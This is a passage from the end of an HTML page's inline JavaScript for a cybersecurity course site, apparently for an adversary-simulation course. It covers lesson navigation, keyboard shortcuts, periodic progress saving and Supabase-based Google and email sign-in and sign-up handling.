        const musicBtn = document.querySelector("#music-dropdown");
        if (musicBtn) {
          const indicator = document.createElement("div");
          indicator.className = "music-indicator";
          indicator.innerHTML = `<i class="fa-solid fa-music"></i> Try Study Music!`;

          musicBtn.style.position = "relative";
          musicBtn.appendChild(indicator);

          setTimeout(() => indicator.remove(), 3000);
        }
      }

      // Initialize Event Listeners
      function initializeEventListeners() {
        // Navigation buttons
        document
          .getElementById("prevLessonBtn")
          ?.addEventListener("click", goToPreviousLesson);
        document
          .getElementById("nextLessonBtn")
          ?.addEventListener("click", goToNextLesson);

        // Reset progress button
        document
          .getElementById("resetProgressBtn")
          ?.addEventListener("click", resetProgress);

        // Mobile menu toggle
        document
          .getElementById("menuToggle")
          ?.addEventListener("click", toggleSidebar);
        document
          .getElementById("sidebarOverlay")
          ?.addEventListener("click", closeSidebar);

        // Keyboard shortcuts
        document.addEventListener("keydown", handleKeyboardShortcuts);

        // Window resize handler
        window.addEventListener("resize", handleWindowResize);

        // Content interaction tracking
        document.getElementById("contentBody")?.addEventListener(
          "scroll",
          debounce(() => {
            trackUserInteraction();
          }, 1000)
        );
      }

      // Keyboard Shortcuts
      function handleKeyboardShortcuts(e) {
        if (document.querySelector(".quiz-question.active")) return;

        if (e.key === "ArrowLeft" && e.ctrlKey) {
          e.preventDefault();
          goToPreviousLesson();
        } else if (e.key === "ArrowRight" && e.ctrlKey) {
          e.preventDefault();
          goToNextLesson();
        }
      }

      // Window Resize Handler
      function handleWindowResize() {
        if (window.innerWidth > 768) {
          closeSidebar();
        }
      }

      // Debounce Helper
      function debounce(func, wait) {
        let timeout;
        return function executedFunction(...args) {
          const later = () => {
            clearTimeout(timeout);
            func(...args);
          };
          clearTimeout(timeout);
          timeout = setTimeout(later, wait);
        };
      }

      // Initialize responsive behavior
      if (window.innerWidth <= 768) {
        document.getElementById("menuToggle").style.display = "inline-flex";
      }

      // Auto-save progress periodically
      setInterval(async () => {
        if (currentUser && Object.keys(courseProgress).length > 0) {
          await saveProgress();
        }
      }, 60000); // Save every minute

      // System initialization logging
      console.log("CyberSec Academy Course System Initialized");
      console.log("Current Course:", COURSE_DATA.title);
      console.log("Total Lessons:", COURSE_DATA.lessons.length);

      // Google OAuth Integration
      const googleBtn = document.querySelector(".btn-google");
      if (googleBtn) {
        googleBtn.addEventListener("click", async () => {
          const { data, error } = await supabase.auth.signInWithOAuth({
            provider: "google",
            options: {
              redirectTo: window.location.origin + "/courses/adversary-simulation-course.html",
            },
          });

          if (error) {
            console.error("Google login error:", error.message);
            showToast("Google login failed: " + error.message, "error");
          }
        });
      }

      // Check for existing session
      supabase.auth.getSession().then(({ data }) => {
        if (data.session) {
          console.log("User already logged in:", data.session.user);
          currentUser = data.session.user;
          startCourseSession();
        }
      });

      // Add missing auth modal functions
      function openAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "flex";
        }
      }

      function closeAuthModal() {
        const modal = document.getElementById("authModal");
        if (modal) {
          modal.style.display = "none";
        }
      }

      // Add auth tab switching functionality
      document.getElementById("tabSignIn")?.addEventListener("click", () => {
        document.getElementById("tabSignIn").classList.add("active");
        document.getElementById("tabSignUp").classList.remove("active");
        document.getElementById("signInForm").style.display = "block";
        document.getElementById("signUpForm").style.display = "none";
      });

      document.getElementById("tabSignUp")?.addEventListener("click", () => {
        document.getElementById("tabSignUp").classList.add("active");
        document.getElementById("tabSignIn").classList.remove("active");
        document.getElementById("signUpForm").style.display = "block";
        document.getElementById("signInForm").style.display = "none";
      });

      document
        .getElementById("closeAuthModal")
        ?.addEventListener("click", closeAuthModal);

      // Improved error handling for auth session
      supabase.auth.onAuthStateChange((event, session) => {
        if (event === "SIGNED_IN") {
          currentUser = session.user;
          closeAuthModal();
          startCourseSession();
        } else if (event === "SIGNED_OUT") {
          currentUser = null;
          openAuthModal();
        }
      });

      // Add form submission handlers
      document
        .getElementById("emailSignInForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signInEmail").value;
          const password = document.getElementById("signInPassword").value;

          try {
            const { data, error } = await supabase.auth.signInWithPassword({
              email,
              password,
            });

            if (error) throw error;

            closeAuthModal();
          } catch (error) {
            showToast(error.message, "error");
          }
        });

      document
        .getElementById("emailSignUpForm")
        ?.addEventListener("submit", async (e) => {
          e.preventDefault();
          const email = document.getElementById("signUpEmail").value;
          const password = document.getElementById("signUpPassword").value;
          const name = document.getElementById("signUpName").value;

          try {
            const { data, error } = await supabase.auth.signUp({
              email,
              password,
              options: {
                data: {
                  full_name: name,
                },
              },
            });

            if (error) throw error;

            showToast(
              "Account created successfully! Please check your email.",
              "success"
            );
          } catch (error) {
            showToast(error.message, "error");
          }
        });
    </script>
  </body>
</html>

